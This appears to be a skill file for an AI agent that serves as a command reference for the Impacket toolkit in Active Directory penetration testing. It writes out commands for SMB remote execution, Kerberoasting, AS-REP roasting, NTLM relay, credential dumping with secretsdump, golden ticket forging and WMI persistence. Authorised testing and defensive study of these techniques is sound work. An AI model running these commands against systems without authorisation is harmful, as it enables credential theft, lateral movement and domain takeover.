---
name: impacket-scripts
description: A collection of Python classes and scripts for working with network protocols, primarily focused on Active Directory and Windows environments. Use for reconnaissance, credential dumping, lateral movement, exploitation (MS14-068), and relay attacks during penetration testing.
---

# impacket-scripts

## Overview
Impacket is a collection of Python classes for working with network protocols. These scripts provide low-level programmatic access to packets and for some protocols (e.g. SMB, MSRPC, LDAP) the entire protocol stack itself. Category: Reconnaissance / Exploitation / Vulnerability Analysis.

## Installation (if not already installed)
Assume the tools are already installed. If missing:
```bash
sudo apt install impacket-scripts
```

## Common Workflows

### Remote Command Execution (SMB)
```bash
impacket-smbexec domain/user:password@10.10.10.15
```

### Kerberoasting (Requesting TGS for cracking)
```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 domain.local/user:password
```

### AS-REP Roasting (Users without pre-auth)
```bash
impacket-GetNPUsers -request -format hashcat -dc-ip 10.10.10.10 domain.local/
```

### NTLM Relay Attack
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## Complete Command Reference

### Execution & Lateral Movement

#### impacket-psexec
PSEXEC-like functionality using RemComSvc.
- `-c pathname`: Copy filename for execution.
- `-path PATH`: Path of command to execute.
- `-file FILE`: Alternative RemCom binary.
- `-service-name name`: Name of service to trigger payload.
- `-remote-binary-name name`: Name of executable uploaded.

#### impacket-smbexec
Semi-interactive shell through SMB.
- `-share SHARE`: Share for output (default C$).
- `-mode {SHARE,SERVER}`: Mode (SERVER requires root).
- `-shell-type {cmd,powershell}`: Choose command processor.

#### impacket-atexec
Execution via Task Scheduler.
- `-session-id ID`: Use existing logon session.
- `-silentcommand`: No output, no cmd.exe.

#### impacket-dcomexec
Execution via DCOM objects.
- `-object {ShellWindows,ShellBrowserWindow,MMC20}`: DCOM object to use.
- `-shell-type {cmd,powershell}`: Shell type.

#### impacket-wmipersist
WMI Event Consumer persistence.
- `install`: Create filter/consumer link.
- `remove`: Delete filter/consumer link.

### Information Gathering & Reconnaissance

#### impacket-GetADUsers / impacket-GetADComputers
Queries domain for user/computer data.
- `-user username`: Specific user data.
- `-all`: (Users only) Return all, including disabled/no email.
- `-resolveIP`: (Computers only) Resolve IP via DC nslookup.

#### impacket-GetUserSPNs
Queries for Service Principal Names (Kerberoasting).
- `-request`: Output TGS in JtR/hashcat format.
- `-stealth`: Remove filter for added stealth.
- `-target-domain`: Query across trusts.

#### impacket-GetNPUsers
Queries for users with "Do not require Kerberos preauthentication".
- `-request`: Export TGTs for cracking.
- `-usersfile FILE`: List of users to test.

#### impacket-lookupsid
Brute force SIDs to find users/groups.
- `maxRid`: Max RID to check (default 4000).
- `-domain-sids`: Enumerate Domain SIDs.

#### impacket-DumpNTLMInfo
Parse NTLM info from target.
- `-protocol [SMB|RPC]`: Protocol to use.

### Credential & Secret Management

#### impacket-GetLAPSPassword
Extract LAPS passwords from LDAP.
- `-computer name`: Target specific computer.
- `-ldaps`: Enable LDAPS (required for Win Server 2025).

#### impacket-Get-GPPPassword
Find and decrypt Group Policy Preferences passwords.
- `-xmlfile FILE`: Specific XML to parse.
- `-share SHARE`: SMB share to search.

#### impacket-secretsdump (Note: Part of impacket, often used with relay)
Dumps SAM, LSA, and NTDS.dit secrets.

#### impacket-dpapi
Unlock Windows Secrets (Vaults, Masterkeys, Credentials).
- Actions: `backupkeys`, `masterkey`, `credential`, `vault`, `unprotect`, `credhist`.

### Kerberos Tools

#### impacket-getTGT / impacket-getST
Request TGT or Service Tickets.
- `-impersonate`: (getST) S4U2Self impersonation.
- `-additional-ticket`: Include ticket for RBCD+KCD.

#### impacket-ticketer
Create Golden/Silver tickets.
- `-spn SPN`: Service for Silver ticket.
- `-domain-sid SID`: Target domain SID.
- `-groups GROUPS`: Comma separated group IDs.

#### impacket-describeTicket
Parse and decrypt Kerberos tickets.
- `--asrep-key HEX`: Decrypt PAC Credentials (UnPAC-the-Hash).

### Relay & Man-in-the-Middle

#### impacket-ntlmrelayx
Comprehensive NTLM relay tool.
- `-t, --target`: Relay target (IP/URL).
- `-socks`: Launch SOCKS proxy for relayed connections.
- `--remove-mic`: Exploit CVE-2019-1040.
- `--adcs`: Enable AD CS relay attack.
- `--shadow-credentials`: Enable Shadow Credentials attack.
- `--sccm-policies`: SCCM policy dump.

#### impacket-smbserver
Launch an SMB server to host shares.
- `-username / -password`: Set authentication.
- `-smb2support`: Enable SMB2.

### Active Directory Manipulation

#### impacket-addcomputer
Add/Delete computer accounts.
- `-method {SAMR,LDAPS}`: Method to use.
- `-delete`: Remove computer account.

#### impacket-dacledit / impacket-owneredit
Edit DACLs or Owners of AD objects.
- `-action {read,write,remove,backup,restore}`.
- `-rights {FullControl,DCSync,etc.}`.

#### impacket-rbcd
Set `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD.

### Database & Registry

#### impacket-mssqlclient
MSSQL client with shell capabilities.
- `-windows-auth`: Use Windows authentication.

#### impacket-reg
Remote Registry manipulation.
- Actions: `query`, `add`, `delete`, `save`, `backup`.

#### impacket-registry-read
Read data from offline registry hives.

### General Options (Most Scripts)
- `-hashes LMHASH:NTHASH`: Authenticate with NTLM hashes.
- `-k`: Use Kerberos authentication (requires KRB5CCNAME).
- `-aesKey hex`: AES key for Kerberos.
- `-dc-ip ip`: IP of the Domain Controller.
- `-target-ip ip`: IP of the target machine.
- `-debug`: Enable verbose debug output.
- `-ts`: Add timestamps to logs.

## Notes
- Many scripts require a valid domain user or administrative privileges on the target.
- Relay attacks (`ntlmrelayx`) require SMB signing to be disabled on the target for SMB relay.
- Kerberos-based scripts require proper DNS resolution or the `-dc-ip` flag.